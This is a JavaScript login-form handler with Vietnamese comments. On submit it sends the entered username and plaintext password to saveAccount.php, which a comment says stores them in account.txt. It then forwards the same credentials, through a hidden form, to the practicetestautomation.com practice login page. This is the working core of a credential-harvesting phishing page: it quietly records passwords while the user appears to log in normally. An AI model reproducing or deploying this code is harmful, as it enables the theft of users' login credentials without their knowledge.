document.addEventListener('DOMContentLoaded', function() {
    // Kiểm tra cookie khi tải trang
    checkCookie();
    
    const loginForm = document.getElementById('loginForm');
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const rememberMe = document.getElementById('rememberMe').checked;

        // Lưu thông tin vào file account.txt qua PHP
        fetch('saveAccount.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        })
        .then(response => response.text())
        .then(() => {
            // Xử lý lưu cookie nếu người dùng chọn nhớ mật khẩu
            if (rememberMe) {
                saveCookie(username);
            } else {
                deleteCookie();
            }
            
            // Submit lên trang xử lý thực tế
            submitToService(username, password);
        });
    });
});

function saveCookie(username) {
    const date = new Date();
    date.setTime(date.getTime() + (30 * 24 * 60 * 60 * 1000)); // 30 ngày
    document.cookie = `savedUsername=${username};expires=${date.toUTCString()};path=/`;
}

function deleteCookie() {
    document.cookie = "savedUsername=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
}

function checkCookie() {
    const cookies = document.cookie.split(';');
    for(let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (cookie.startsWith('savedUsername=')) {
            const savedUsername = decodeURIComponent(cookie.substring(13));
            document.getElementById('username').value = savedUsername;
            document.getElementById('rememberMe').checked = true;
            break;
        }
    }
}

function submitToService(username, password) {
    // Tạo form ẩn để submit
    const form = document.createElement('form');
    form.method = 'post';
    form.action = 'https://practicetestautomation.com/practice-test-login/';
    
    // Thêm các field cần thiết
    const usernameInput = document.createElement('input');
    usernameInput.type = 'hidden';
    usernameInput.name = 'UserName';
    usernameInput.value = username;
    
    const passwordInput = document.createElement('input');
    passwordInput.type = 'hidden';
    passwordInput.name = 'Password';
    passwordInput.value = password;
    
    form.appendChild(usernameInput);
    form.appendChild(passwordInput);
    
    // Thêm vào body và submit
    document.body.appendChild(form);
    form.submit();
}